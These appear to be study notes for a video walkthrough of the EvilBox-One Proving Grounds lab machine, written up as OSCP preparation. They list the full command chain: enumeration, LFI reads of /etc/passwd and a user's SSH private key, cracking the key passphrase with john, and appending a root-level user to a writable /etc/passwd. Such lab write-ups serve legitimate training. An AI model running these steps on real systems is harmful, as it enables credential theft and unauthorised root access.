This video walkthrough covers the penetration testing steps for the **EvilBox-One** machine on Offensive Security's Proving Grounds Play (PG-Play). The walkthrough demonstrates initial enumeration, achieving a Local File Inclusion (LFI) vulnerability to gain initial access via SSH, and finally, escalating privileges to root.

-----

## 📝 Comprehensive Notes & Commands for OSCP

### **Stage 1: Initial Enumeration & Web Reconnaissance**

The initial step is to run a thorough port scan using **Nmap** to identify open services and then perform web content discovery using **Wfuzz**.

| Area | Command & Findings | Notes & Timestamps |
| :--- | :--- | :--- |
| **Nmap Scan** | `nmap -p- -sCV -oN nmap/evilbox -T4 <TARGET_IP>` | **Open Ports:** **22/SSH** (Debian) and **80/HTTP** [[32:14](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=1934)]. |
| **Directory Fuzzing** | `wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://<TARGET_IP>/FUZZ/` | Discovered: **/secret** directory [[37:17](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=2237)]. |
| **File Fuzzing (on /secret)** | `wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 http://<TARGET_IP>/secret/FUZZ.php` | Fuzzing for `.php` files led to the discovery of **evil.php** [[47:29](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=2849)]. |
| **Parameter Fuzzing** | `wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hc 0 http://<TARGET_IP>/secret/evil.php?FUZZ=1` | Discovered a hidden parameter: **command** [[51:03](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3063)]. |

-----

### **Stage 2: Initial Compromise (LFI & SSH Access)**

The `evil.php` page with the `command` parameter was found to be vulnerable to a **Local File Inclusion (LFI)** attack, which was leveraged to find credentials for SSH.

| Step | Command/Action | Finding/Result & Timestamps |
| :--- | :--- | :--- |
| **LFI for User** | `curl http://<TARGET_IP>/secret/evil.php?command=/etc/passwd` | Found system user: **morie** [[52:45](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3165)]. |
| **LFI for SSH Key** | `curl http://<TARGET_IP>/secret/evil.php?command=/home/morie/.ssh/id_rsa` | Successfully retrieved **morie's SSH private key** [[54:14](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3254)]. |
| **Extract Hash** | `ssh2john id_rsa > crackme` | Converts the passphrase-protected SSH key into a crackable hash file [[55:51](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3351)]. |
| **Crack Passphrase** | `john --wordlist=/usr/share/wordlists/rockyou.txt crackme` | Cracked the passphrase: **unicorn** [[56:22](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3382)]. |
| **SSH Access** | 1. `chmod 600 id_rsa`<br>2. `ssh -i id_rsa morie@<TARGET_IP>`<br> (Enter passphrase: `unicorn`) | Successfully logged in as user **morie** [[56:47](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3407)]. |

-----

### **Stage 3: Privilege Escalation to Root**

After gaining user access, a manual privilege escalation check revealed a critical misconfiguration: write permissions on the `/etc/passwd` file.

| Step | Command/Action | Finding/Result & Timestamps |
| :--- | :--- | :--- |
| **Privilege Check** | `ls -l /etc/passwd` | Discovered **write permissions** on the file for a low-privileged user [[01:01:44](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3704)]. |
| **Exploit: Create Hash** | *OpenSSL can be used to generate a password hash.* The hash used in the video (starting with `$1$`) equates to the password **ihearthacking**. | The intent is to create a root-level user with a known password. |
| **Exploit: Add User** | `echo 'siren:$1$05fDqK5p$27s74eR5g/5oB4F4jS8n60:0:0::/root:/bin/bash' >> /etc/passwd` | Appended a new user (`siren`) with **UID 0** (root) and **GID 0** to `/etc/passwd` [[01:02:46](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3766)]. |
| **Gain Root** | `su siren` <br> (Enter password: `ihearthacking`) | **Root access achieved** [[01:03:22](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3802)]. |

**Takeaway Concept:** A common and critical privilege escalation misconfiguration is improper permissions on sensitive system files like `/etc/passwd`, allowing a low-privileged user to append a new root user entry. [[01:06:36](http://www.youtube.com/watch?v=XQnkiuIFZ-c&t=3996)]

http://googleusercontent.com/youtube_content/0